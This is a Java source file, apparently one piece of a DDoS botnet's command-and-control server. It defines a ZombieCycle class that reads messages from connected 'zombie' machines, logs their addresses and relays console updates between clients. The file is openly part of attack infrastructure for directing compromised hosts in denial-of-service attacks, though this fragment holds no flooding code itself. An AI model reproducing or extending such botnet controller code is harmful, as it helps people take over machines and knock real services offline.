package org.ddos.server;

import java.io.IOException;
import java.net.SocketAddress;

import org.jnetwork.DataPackage;
import org.jnetwork.Server;
import org.jnetwork.SocketPackage;

public class ZombieCycle {
	public void start(DDOSServer ddosServer, Server server, SocketPackage event) throws ClassNotFoundException, IOException {
		while (!event.getConnection().isClosed()) {
			DataPackage pkgIn = (DataPackage) event.getInputStream().readObject();

			System.out.println("Package received from zombie " + event.getConnection().getRemoteSocketAddress() + ": "
					+ pkgIn.getMessage() + " (ID: " + pkgIn.getId() + ")");
			if (pkgIn.getMessage().equals("CONSOLE_UPDATE")) {
				server.getClient((SocketAddress) pkgIn.getObjects()[0]).getOutputStream()
						.writeObject(new DataPackage(pkgIn.getObjects()[1]).setMessage("CONSOLE_UPDATE"));
			}
		}
	}
}